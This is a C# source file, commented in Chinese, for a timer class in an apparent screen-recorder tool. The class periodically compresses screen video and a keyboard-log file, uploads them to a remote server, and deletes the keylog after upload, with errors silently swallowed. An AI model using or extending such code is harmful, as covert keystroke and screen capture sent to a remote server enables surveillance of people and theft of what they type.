using System;
using System.Timers;
using System.IO;
using System.Threading.Tasks;

namespace ScreenRecorder
{
    /// <summary>
    /// 自动上传定时器类，负责定时检查和执行自动上传功能
    /// </summary>
    public class AutoUploadTimer
    {
        private System.Timers.Timer? timer;
        private DateTime lastAutoUploadTime;
        private int autoUploadIntervalMinutes = 2; // 自动上传间隔（分钟）- 为测试缩短为1分钟
        private FileCompressor fileCompressor;
        private FileUploader fileUploader;

        public event EventHandler? AutoUploadRequired;

        public int AutoUploadIntervalMinutes
        {
            get { return autoUploadIntervalMinutes; }
            set { autoUploadIntervalMinutes = value; }
        }

        public AutoUploadTimer(FileCompressor compressor, FileUploader uploader)
        {
            fileCompressor = compressor;
            fileUploader = uploader;
        }

        /// <summary>
        /// 初始化并启动自动上传定时器
        /// </summary>
        public void Initialize()
        {
            lastAutoUploadTime = DateTime.Now;

            timer = new System.Timers.Timer();
            timer.Interval = 60000; // 每分钟检查一次
            timer.Elapsed += Timer_Elapsed;
            timer.Start();
        }

        /// <summary>
        /// 停止自动上传定时器
        /// </summary>
        public void Stop()
        {
            if (timer != null)
            {
                timer.Stop();
                timer.Dispose();
                timer = null;
            }
        }

        /// <summary>
        /// 定时器事件处理
        /// </summary>
        private void Timer_Elapsed(object? sender, ElapsedEventArgs e)
        {
            // 直接检查是否需要自动上传，不再需要UI线程
            CheckAutoUpload();
        }

        /// <summary>
        /// 检查是否需要自动上传
        /// </summary>
        public void CheckAutoUpload()
        {
            TimeSpan elapsedTime = DateTime.Now - lastAutoUploadTime;
            if (elapsedTime.TotalMinutes >= autoUploadIntervalMinutes)
            {
                // 触发自动上传事件
                AutoUploadRequired?.Invoke(this, EventArgs.Empty);
                lastAutoUploadTime = DateTime.Now;
            }
        }

        /// <summary>
        /// 执行自动上传操作
        /// </summary>
        /// <param name="videoOutputPath">视频文件路径</param>
        /// <param name="keylogPath">键盘记录文件路径</param>
        public async Task PerformAutoUploadAsync(string videoOutputPath, string keylogPath)
        {
            if (string.IsNullOrEmpty(videoOutputPath) || string.IsNullOrEmpty(keylogPath))
                return;

            try
            {
                // 确保所有操作都在后台线程中完成
                await Task.Run(async () =>
                {
                    try
                    {
                        // 等待一段时间确保文件句柄被释放
                        await Task.Delay(100);

                        // 直接调用异步版本的压缩方法
                        string autoUploadZipFilePath = await fileCompressor.CompressFilesForAutoUploadAsync(videoOutputPath, keylogPath);

                        if (!string.IsNullOrEmpty(autoUploadZipFilePath))
                        {
                            // 等待一段时间确保压缩文件句柄被释放
                            await Task.Delay(100);

                            // 执行上传操作，并传递键盘记录文件路径以便在上传完成后删除
                            await fileUploader.UploadToRemoteServerAsync(autoUploadZipFilePath, keylogPath);
                        }
                    }
                    catch (Exception)
                    {
                        // 内部异常已经被处理，避免再次抛出
                    }
                });
            }
            catch (Exception)
            {
                // 在控制台模式下，错误会通过ConsoleApp处理
            }
        }
    }
}